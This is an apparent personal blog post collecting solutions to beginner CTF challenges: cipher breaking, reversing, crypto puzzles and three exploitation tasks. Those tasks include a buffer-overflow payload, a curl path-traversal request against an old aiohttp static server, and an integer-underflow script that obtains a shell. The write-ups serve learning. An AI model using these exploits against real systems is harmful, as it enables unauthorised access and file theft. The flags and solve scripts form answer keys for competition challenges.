---
year: 2026
month: 08
day: 30
---
# Baby joseph writeups

This post contains all of my writeups for Joseph's baby-difficulty challenges. See [The Joseph Challenge](/blog/the-joseph-challenge) for more information.

## Overview

@TableOfContents{"depth":1}@

## rot-i

> Ypw'zj zwufpp hwu txadjkcq dtbtyu kqkwxrbvu! Mbz cjzg kv IAJBO{ndldie_al_aqk_jjrnsxee}. Xzi utj gnn olkd qgq ftk ykaqe uei mbz ocrt qi ynlu, etrm mff'n wij bf wlny mjcj :).

First word is probably `You're`. Second sentence is probably `The flag is DUCTF{...}`.

I guessed that it's vaguely related to Vigenere cipher (i.e. shifts that vary by position in the ciphertext) rather than a substitution, just because there seemed to be quite a few awkward double letters in places that seemed unlikely for double letters.

I pasted the second sentence into Cyber Chef in Vigenere decode mode and typed `theflagisductf` as the key. That outputted `tuvxyzacdfghij`. There's clearly some sort of pattern going on here, but it's not completely clear what the logic behind it would be.

I pasted the original ciphertext into the same Cyber Chef setup and typed `youre` as the key. That outputted `abcif`. It doesn't appear to be a substring of the key fragment I obtained from the second sentence, but it does seem similar (in that it has runs). I then concatenated the two keys together and began typing the alphabet in between the two to pad things out and get them to line up. At some point during that process `crypto` jumped out as the first word of the flag. Progress!

At this point, while writing my live writeup, I realised what the challenge name means... I reckon that it's a caesar cipher where the index is `i`, and it has been implemented in such a way that it uses the index of the character in the plaintext (which includes punctuation) while leaving non-alphabetic characters untouched. That would explain the alphabetic runs in my key fragments, and would also explain the skipped letters.

```py
import string

xs = "Ypw'zj zwufpp hwu txadjkcq dtbtyu kqkwxrbvu! Mbz cjzg kv IAJBO{ndldie_al_aqk_jjrnsxee}. Xzi utj gnn olkd qgq ftk ykaqe uei mbz ocrt qi ynlu, etrm mff'n wij bf wlny mjcj :)."

out = ""
for i, x in enumerate(xs):
    ls = string.ascii_lowercase
    us = string.ascii_uppercase
    if x in ls:
        out += ls[(ls.index(x) - i) % 26]
    elif x in us:
        out += us[(us.index(x) - i) % 26]
    else:
        out += x

print(out)
```

```
You've solved the beginner crypto challenge! The flag is DUCTF{crypto_is_fun_kjqlptzy}. Now get out some pen and paper for the rest of them, they won't all be this easy :).
```

It turns out that my original intuition for the first word was incorrect! It was `You've`, not `You're`.

That really shouldn't have taken me 35 minutes...

The thing that messed me up was that punctuation was being included in the indexing even though it's excluded from the encryption. Having indexed rotations crossed my mind because of all of the runs that I was getting in my key fragments, but I discarded that idea because they weren't perfect runs of characters. I even noticed that it was breaking on the punctuation specifically but I ignored that idea in the moment as a coincidence. Rookie mistakes.

Flag: `DUCTF{crypto_is_fun_kjqlptzy}`

## no-strings

We're given a binary, and this is a reverse engineering challenge, so I first `strings`'d the binary, and then found nothing so I opened up the binary in Binary Ninja.

```c
printf("flag? ");
char buf[0x48];
fgets(&buf, 0x46, stdin);
int32_t var_6c = 0;
int32_t result;

while (true) {
    if ((int64_t)var_6c >= strlen(&buf) - 1) {
        puts("correct!");
        result = 0;
        break;
    }
    
    if (buf[(int64_t)var_6c] != *(uint8_t*)((int64_t)(var_6c * 2) + flag)) {
        puts("wrong!");
        result = -1;
        break;
    }
    
    var_6c += 1;
}
```

It checks each character of the input against `flag[index * 2]` (which explains why nothing would show up in the output of `strings ./nostrings`).

Double clicking the `flag` symbol in Binary Ninja just instantly solves the challenge, because Binary Ninja recognises it as some sort of wide character encoding and decodes it correctly.

```c
00404050  wchar16 const (* flag)[0x1e] = data_402008 {u"DUCTF{stringent_strings_string"}
```

Ok, much better, that challenge only took 3 minutes.

Flag: `DUCTF{stringent_strings_string`

## Substitution Cipher I

We get the following Sage script, along with an `output.txt` file;

```py
def encrypt(msg, f):
    return ''.join(chr(f.substitute(c)) for c in msg)

P.<x> = PolynomialRing(ZZ)
f = 13*x^2 + 3*x + 7

FLAG = open('./flag.txt', 'rb').read().strip()

enc = encrypt(FLAG, f)
print(enc)
```

It substitutes each character in the text with the output of a polynomial. All of the polynomial's coefficients are positive so the polynomial is monotonically increasing, meaning that each distinct character (positive by definition) will map to a distinct substitution. Don't worry if none of that makes sense, because I didn't even think of that while solving the challenge, I just went in with the assumption that the challenge is easy.

My chosen approach was to sidestep the maths by generating a lookup table from substitution to original character, and then mapping the ciphertext through that lookup table.

```py
ct = open("./output.txt", "r").read().strip()

lookup = {}
for x in range(128):
    y = 13 * x * x + 3 * x + 7
    lookup[y] = chr(x)

pt = ""
for c in ct:
    pt += lookup[ord(c)]

print(pt)
```

Another easy one out of the way; that took around 6 minutes.

Flag: `DUCTF{sh0uld'v3_us3d_r0t_13}`

## babyp(y)wn

We get given the following challenge file;

```py
#!/usr/bin/env python3

from ctypes import CDLL, c_buffer
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
buf1 = c_buffer(512)
buf2 = c_buffer(512)
libc.gets(buf1)
if b'DUCTF' in bytes(buf2):
    print(open('./flag.txt', 'r').read())
```

I assumed that `buf1` and `buf2` were both allocated on the heap (and likely one after another). `gets` gives us a trivial buffer overflow, so we can overflow from `buf1` to `buf2`. In libc each heap allocation has 16 bytes of metadata before it, so we have to overflow 512 bytes of `buf1`, then 16 bytes for the header of `buf2`, and then we can write `DUCTF` to the userdata portion of the `buf2` allocation. This lands `DUCTF` write at the start of `buf2`. Now that I'm writing this down I've realised that we get the flag as long as `DUCTF` is anywhere in `buf2`, so I could've overshot for safety, but it felt good lining it up nicely.

```py
from pwn import process

p = process(["/usr/bin/python3", "./babypywn.py"])
p.sendline(b"A" * (512 + 16) + b"DUCTF")
print(p.recvall())
```

I didn't note down exactly when I started working on this challenge, but I think it only took a few minutes.

Flag: `DUCTF{C_is_n0t_s0_f0r31gn_f0r_incr3d1bl3_pwn3rs}`

## source provided

We get a binary along with the assembly source code that the binary was produced from. I've included an annotated version of the assembly program below. I just happened to remember the syscall numbers that this program uses, but [syscall.sh](https://x64.syscall.sh/) is a great resource if you ever need to get information about Linux syscalls.

```asm
SECTION .data
c db 0xc4, 0xda, 0xc5, 0xdb, 0xce, 0x80, 0xf8, 0x3e, 0x82, 0xe8, 0xf7, 0x82, 0xef, 0xc0, 0xf3, 0x86, 0x89, 0xf0, 0xc7, 0xf9, 0xf7, 0x92, 0xca, 0x8c, 0xfb, 0xfc, 0xff, 0x89, 0xff, 0x93, 0xd1, 0xd7, 0x84, 0x80, 0x87, 0x9a, 0x9b, 0xd8, 0x97, 0x89, 0x94, 0xa6, 0x89, 0x9d, 0xdd, 0x94, 0x9a, 0xa7, 0xf3, 0xb2

SECTION .text

global main

main:
    xor rax, rax ; rax=0 (selects the 'read' syscall)
    xor rdi, rdi
    mov rdx, 0x32
    ; allocate space on the heap
    sub rsp, 0x32
    mov rsp, rsi
    ; read 0x32 bytes into the stack (at rsp)
    syscall

    ; loop 
    mov r10, 0
l:
    ; r11 = r10th byte of input
    movzx r11, byte [rsp + r10]
    ; r12 = r10th byte of reference data
    movzx r12, byte [c + r10]
    ; r11 = (char)((r11 + r10 + 0x42) ^ 0x42)
    add r11, r10
    add r11, 0x42
    xor r11, 0x42
    and r11, 0xff
    ; if r11 != r12 { exit(1); }
    cmp r11, r12
    jne b

    ; r10 += 1
    ; if r10 == 0x32 { break; }
    add r10, 1
    cmp r10, 0x32
    jne l

    ; exit(0)
    mov rax, 0x3c
    mov rdi, 0
    syscall

b:
    mov rax, 0x3c
    mov rdi, 1
    ; exit(1)
    syscall
```

We can use a similar approach to my solution for [Substitution Cipher I](#substitution-cipher-i) and just bruteforce each character instead of actually reversing the maths. I find this approach to be less error prone during CTFs because you only have to copy the logic across from the source program (instead of copying it *and* reversing it).

```py
xs = [0xc4, 0xda, 0xc5, 0xdb, 0xce, 0x80, 0xf8, 0x3e, 0x82, 0xe8, 0xf7, 0x82, 0xef, 0xc0, 0xf3, 0x86, 0x89, 0xf0, 0xc7, 0xf9, 0xf7, 0x92, 0xca, 0x8c, 0xfb, 0xfc, 0xff, 0x89, 0xff, 0x93, 0xd1, 0xd7, 0x84, 0x80, 0x87, 0x9a, 0x9b, 0xd8, 0x97, 0x89, 0x94, 0xa6, 0x89, 0x9d, 0xdd, 0x94, 0x9a, 0xa7, 0xf3, 0xb2]

out = []
for i, x in enumerate(xs):
    found = False
    for y in range(256):
        z = ((y + i + 0x42) ^ 0x42) & 0xff
        if x == z:
            out.append(y)
            found = True
            break
    if not found:
        print(i, x)
        print("not found")
        exit()

print("".join(map(chr, out)))
```

Another nice 10 minutes challenge.

Flag: `DUCTF{r3v_is_3asy_1f_y0u_can_r34d_ass3mbly_r1ght?}`

## Baby ARX

The challenge gives us the following handout;

```py
class baby_arx():
    def __init__(self, key):
        assert len(key) == 64
        self.state = list(key)

    def b(self):
        b1 = self.state[0]
        b2 = self.state[1]
        b1 = (b1 ^ ((b1 << 1) | (b1 & 1))) & 0xff
        b2 = (b2 ^ ((b2 >> 5) | (b2 << 3))) & 0xff
        b = (b1 + b2) % 256
        self.state = self.state[1:] + [b]
        return b

    def stream(self, n):
        return bytes([self.b() for _ in range(n)])


FLAG = open('./flag.txt', 'rb').read().strip()
cipher = baby_arx(FLAG)
out = cipher.stream(64).hex()
print(out)

# cb57ba706aae5f275d6d8941b7c7706fe261b7c74d3384390b691c3d982941ac4931c6a4394a1a7b7a336bc3662fd0edab3ff8b31b96d112a026f93fff07e61b
```

The first thing that jumped out at me is that `cipher.stream(64)` essentially ends up giving you the full internal state of the cipher as it is at the end of producing that stream. That happens because the internal state is 64 bytes, and each `b` operation removes the first byte of the state while appending the newly produced byte (which it also returns) to the end of the state. So after 64 `b` operations we know the full state.

Given that we know the current state of the cipher, and we know that the state of the cipher 64 operations ago was flag, our goal should be to find a way to reverse the operation that `b` performs on the cipher's state.

Looking at the implementation of `b`, I could see that we had to compute `b1`, and that we know `b` and `b2`. Somewhat confusingly, the function reassigns the `b1` and `b2` variables, which led to a mistake that took me 5-10 minutes to debug (I was using the `b2` retrieved from the state directly instead of passing it through the 'rotate right by 5' operation first). I'm going to call the second values of `b1` and `b2`, `b1'` and `b2'` respectively.

We know `b` and we can compute `b2' = ror(b2, 5)`, so we can compute `b1'` using subtraction (modulo 256). Then all we have to do is compute `b1` from `b1'`. Once again we can use a bruteforce to avoid reversing the maths directly (which in this case might also be the only way? I dunno I haven't put much thought into that).

Piecing it all together, I ended up with the following solve script;

```py
state = list(bytes.fromhex("cb57ba706aae5f275d6d8941b7c7706fe261b7c74d3384390b691c3d982941ac4931c6a4394a1a7b7a336bc3662fd0edab3ff8b31b96d112a026f93fff07e61b"))

def undo_weird_xor(y: int) -> int:
    for x in range(256):
        if x ^ (((x << 1) | (x & 1)) & 0xff) == y:
            return x
    print("not found (weird)")
    exit(1)

def rev(state: list) -> list:
    b2 = state[0]
    b2 = (b2 ^ ((b2 >> 5) | (b2 << 3))) & 0xff
    b = state[-1]
    b1 = (b - b2) % 256
    b1 = undo_weird_xor(b1)
    return [b1] + state[:-1]

for _ in range(64):
    state = rev(state)

print(bytes(state).decode())
```

This challenge took me about 20 minutes (much of which was spent debugging the aforementioned error in my solve script).

Flag: `DUCTF{i_d0nt_th1nk_th4ts_h0w_1t_w0rks_actu4lly_92f45fb961ecf420}`

## static file server

We get the following handout; (I've omitted the index page content because it's unrelated)

```py
from aiohttp import web

async def index(request):
    return web.Response(body='...', content_type='text/html', status=200)

app = web.Application()
app.add_routes([
    web.get('/', index),

    # this is handled by https://github.com/aio-libs/aiohttp/blob/v3.8.5/aiohttp/web_urldispatcher.py#L654-L690
    web.static('/files', './files', follow_symlinks=True)
])
web.run_app(app, port=8081)`
```

The program is very simple, so it's likely that it's a path traversal bug in the library itself. The comment left by the challenge author reinforced that suspicion.

We can use CURL with `--path-as-is` to try exploiting the path traversal. If you don't supply the `--path-as-is` flag, then CURL will collapse the path traversal before sending the URL to the server, just as a browser would.

```sh
curl --path-as-is http://localhost:8080/files/../flag.txt
```

This challenge took 10 minutes, but most of that was spent trying against the wrong `aiohttp` version... (3.14.3 instead of 3.8.5)

Flag: `DUCTF{../../../p4th/tr4v3rsal/as/a/s3rv1c3}`

## downunderflow

We get the following handout;

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define USERNAME_LEN 6
#define NUM_USERS 8
char logins[NUM_USERS][USERNAME_LEN] = { "user0", "user1", "user2", "user3", "user4", "user5", "user6", "admin" };

int read_int_lower_than(int bound) {
    int x;
    scanf("%d", &x);
    if(x >= bound) {
        puts("Invalid input!");
        exit(1);
    }
    return x;
}

int main() {
    printf("Select user to log in as: ");
    unsigned short idx = read_int_lower_than(NUM_USERS - 1);
    printf("Logging in as %s\n", logins[idx]);
    if(strncmp(logins[idx], "admin", 5) == 0) {
        puts("Welcome admin.");
        system("/bin/sh");
    } else {
        system("/bin/date");
    }
}
```

We get a shell if we enter the index `7`, but `read_int_lower_than(NUM_USERS - 1)` stops us from directly entering `7`. Luckily the program casts the return value of `read_int_lower_than` from an `int` to an `unsigned short`, which gives us an opportunity to mess with things.

As long as the least significant two bytes of our chosen index (represented as a signed 32 bit integer) are `7`, then we'll get admin.

`read_int_lower_than` allows negative numbers, so we can enter a negative number with `0x0007` as its lower two bytes and get a shell.

My chosen approach was to construct our malicious index as bytes, and then interpret it as a signed integer to get the index that we pass to the program. Our only two constraints are that the lower two bytes are `0x0007` (to log in as admin) and that the highest bit is `1` (so that it gets interpreted as a negative number).

```py
import struct
from pwn import process

p = process("./downunderflow")
idx = struct.unpack("<i", 0xffff0007.to_bytes(4, byteorder="little"))[0]
p.sendlineafter(b"as: ", str(idx).encode())
p.sendlineafter(b"admin.", b"cat flag.txt")
p.sendline("exit")
print(p.recvall().decode())
```

The computed `idx` ends up being `-65529`, but there are plenty of values that work (just change the `0xffff` to whatever you want as long as the most significant bit is `1`).

Funnily enough, the author ended up using the same index (so there's probably a nicer way of getting to this number...)

This challenge took me around 15 minutes (I had to look up the `struct` docs again and my VM was being slow).

Flag: `DUCTF{-65529_==_7_(mod_65536)}`

## complementary

We get the following handout;

```py
flag = open("./flag.txt", "rb").read().strip()
m1 = int.from_bytes(flag[: len(flag) // 2])
m2 = int.from_bytes(flag[(len(flag) // 2):])
n = m1 * m2
print(n)

# 6954494065942554678316751997792528753841173212407363342283423753536991947310058248515278
```

Basically the only thing we can do to begin is to factorise `n`. I used `factorint` from `sympy` to do so, and go the following factorisation:

```py
{2: 1, 3: 1, 19: 1, 31: 1, 83: 1, 3331: 1, mpz(165219437): 1, mpz(550618493): 1, mpz(66969810339969829): 1, 1168302403781268101731523384107546514884411261: 1}
```

The keys of the dictionary are the factors, and the values are their multiplicity (e.g. if we factorised 12 then we'd get `{2: 2, 3: 1}` because its factorisation is `2 * 2 * 3`).

Now that we have the prime factorisation, we're left with a new conundrum: which factors came from `m1` and which came from `m2`?

One clue we have is that both `m1` and `m2` will either have the same number of bytes as eachother, or `m2` will have one more byte than `m1`. We can figure out how long the flag is, because `log2(m1) + log2(m2) = log2(m1 * m2)`. `log2(m1)` is the number of bits in `m1` (unknown), `log2(m2)` is the number of bits in `m2` (also unknown), and `log2(m1 * m2)` is the number of bits in `n`, which we already know.

Because we know that we're actually working in bytes, we can make things slightly easier to think about by measuring the sizes of our numbers in bytes. We can do that by taking our `log`s in base 256 instead of base 2.

`math.log(n, 256)` gives us 36.47, so `n` has 37 bytes, and by extension the flag probably has 37 bytes as well (it's probably possible to construct a non-ASCII flag that leads to this measurement being off-by-one somehow, but we don't have to worry about that and can assume that the challenge was designed to be relatively straightforward).

From that we can compute that `m1` must have 18 bytes and `m2` must have 19 bytes. It turns out that the largest factor of `n` also has 19 bytes, so it's a good candidate for `m2`. It's important to note that we could multiply that value by `2` or `3` and still have it remain 19 bytes, but I didn't have to worry about handling that in my solve script because the largest factor happened to actually be `m2` and everything worked out.

From there we can compute `m1` as the product as all of the other factors, and then we can convert `m1` and `m2` back to bytes and concatenate them back together to get the flag.

```py
from sympy import factorint
from Crypto.Util.number import long_to_bytes

factors = factorint(int(open("output.txt", "r").read().strip()))
m1 = 1
for k, v in list(factors.items())[:-1]:
    m1 *= pow(k, v)
m2 = list(factors.keys())[-1]

flag = long_to_bytes(m1) + long_to_bytes(m2)
print(flag)
```

This challenge took about 10 minutes to solve.

Flag: `DUCTF{is_1nt3ger_f4ct0r1s4t10n_h4rd?}`

## randomly chosen

We get the following handout;

```py
import random

random.seed(random.randrange(0, 1337))
flag = open('./flag.txt', 'r').read().strip()
out = ''.join(random.choices(flag, k=len(flag)*5))
print(out)

# bDacadn3af1b79cfCma8bse3F7msFdT_}11m8cicf_fdnbssUc{UarF_d3m6T813Usca?tf_FfC3tebbrrffca}Cd18ir1ciDF96n9_7s7F1cb8a07btD7d6s07a3608besfb7tmCa6sasdnnT11ssbsc0id3dsasTs?1m_bef_enU_91_1ta_417r1n8f1e7479ce}9}n8cFtF4__3sef0amUa1cmiec{b8nn9n}dndsef0?1b88c1993014t10aTmrcDn_sesc{a7scdadCm09T_0t7md61bDn8asan1rnam}sU
```

It uses randomness, but only chooses from 1337 possible, so we can bruteforce! (I'm starting to sense a theme...)

There's not too much to this one other than remembering to strip the newline from the input file when reading it in (if your code works like mine and uses `len(out)` as the number of random choices).

To replicate the form of randomness that the challenge program is doing, I construct a list with the same length as the flag, but containing indices instead of the characters of the flag. That tells us which indices got chosen, and lets us reconstruct the flag from the output (we know where each character came from).

```py
import random

out = open("output.txt", "r").read().strip()
flag_len = len(out) // 5
indices = list(range(flag_len))
for seed in range(1337):
    random.seed(seed)
    flag = ["?"] * flag_len
    xs = random.choices(indices, k=len(out))
    for x, y in zip(xs, out):
        flag[x] = y
    flag = "".join(flag)
    if flag.startswith("DUCTF"):
        print(flag)
        break
```

This challenge took around 7 minutes or so to solve.

Flag: `DUCTF{is_r4nd0mn3ss_d3t3rm1n1st1c?_cba67ea78f19bcaefd9068f1a}`

## flag art

We get the following hand out, along with an ASCII art version of the DUCTF logo;

```py
message = open('./message.txt', 'rb').read() + open('./flag.txt', 'rb').read()

palette = '.=w-o^*'
template = list(open('./mask.txt', 'r').read())

canvas = ''
for c in message:
    for m in [2, 3, 5, 7]:
        while True:
            t = template.pop(0)
            if t == 'X':
                canvas += palette[c % m]
                break
            else:
                canvas += t

print(canvas)
```

```
                                                           ==                                   
                                          wo=.=*.w.        ^==-                                 
                                     ^..ow==w*.w=o=        .w^.                                 
                                .--==w*.w=o=...=.=         *.w.^==                              
                             .-.wwo=.=*.w.^.wwo==.-=.=     *..--.=-*=                           
                           ....w.^==-^.wwo.w=o.wo*=...==.-.wwo=.o=.wo                           
                         *==w*..--..--=w=-.w.^==-^=w=-=.-^.wwo..o..wo*                          
                    =w=-.wwo==oo==w*==.-=www.wwo.wo*==w*==.-.wwo=.w=..-                         
            *..-*.wwo.=-o=.oo==.-.wwo==.-      =.=*        .wwo.wo*=w=-..                       
          ow=w=-.wwo==w*..ow=w=-.wwo                       ==.-=.=*==oo=w=-.                    
          wwo..ow==w*.w.^.=.w=.=*==o                       o.wwo=wo.=.=*..ow.=                  
          .w==.-.wwo.w=o=.=*.wwo==oo                       ==w*=www=w=-.wwo.w=o.w               
          o*=w=-.wwo==oo=w=-==.-==.-                       ==w*==-^=w=-.wwo..--=.               
          =*.w.^==-^.wwo=w=-.w.^=.=*      =.w^      ==-^   .wo*.==o.wwo=wo^=.=*=.               
            w^..ow.wwo..wo..--==w*==-^.wwo=...==.-.=-w.w   wo.w-^==.===wo..o..=..               
              =.-o..ow=.=w=.o=..-*.w.^==.-.w=o..ow=.w^=.   o=.w=o==o...-*.w.^=w.                
              o..-*..wo=w.o..wo..--.=w-==-^=w.o..wo..ow.   .-*==oo=w.o..wo..--.                 
              =w-==-^=w.o.=w-..ow==.        *=w.o.w-.===   w=w.o..--..-*..-*=                   
               www=.w^.=w.=w.o.w=              o.=w-.w-...--=.=w=w.o..-*..ow                    
                 =w.o=                             .o=.wo*==o..w.^=.=w==.                       
                                                      -=.=w=w.o..ow=.=w==                       
                                                        oo.=w-==o..w.^.=                        
                                                           .w=.   =w.                           
                                                                                                
                                                                .ow==o..w                       
                                                                .^==-^=.-                       
                                                                  .=w.*
```

By reversing the art rendering process we can obtain the result of `x % n` for each character `x` of the flag and each moduli from `[2, 3, 5, 7]`. By the Chinese Remainder Theorem (CRT), these values (called residues) allow us to distinguish between all values from 0 up to and including 209 (`2 * 3 * 5 * 7 - 1`).

There is nice maths we can do to reverse it, but I wanted to solve this challenge quickly, and there are only 128 possible values for each character of the flag (if we assume that it's ASCII). I think you can guess what approach I took instead of implementing a CRT solver...

```py
palette = '.=w-o^*'
moduli = [2, 3, 5, 7]

art = open("output.txt", "r").read().strip()

def crt_byte(residues: list[int], moduli: list[int]) -> int:
    # Bruteforce the byte! (even though there's a nice way to solve this
    # mathematically and I have a mathematics degree)
    for x in range(256):
        ys = [x % n for n in moduli]
        if ys == residues:
            return x
    print(f"not found: {residues}, {moduli}")
    exit(1)

flag = []
residues = []
for c in art:
    if c not in palette:
        continue
    idx = palette.index(c)
    residues.append(idx)
    if len(residues) == len(moduli):
        flag.append(crt_byte(residues, moduli))
        residues = []

print(bytes(flag).decode())
```

> Congratulations on solving this challenge! The mask has 900 X's so here are some random words to make the message long enough. Your flag is: DUCTF{r3c0nstruct10n_0f_fl4g_fr0m_fl4g_4r7_by_l00kup_t4bl3_0r_ch1n3s3_r3m41nd3r1ng?}

This challenge took around 5 minutes to solve.

Flag: `DUCTF{r3c0nstruct10n_0f_fl4g_fr0m_fl4g_4r7_by_l00kup_t4bl3_0r_ch1n3s3_r3m41nd3r1ng?}`
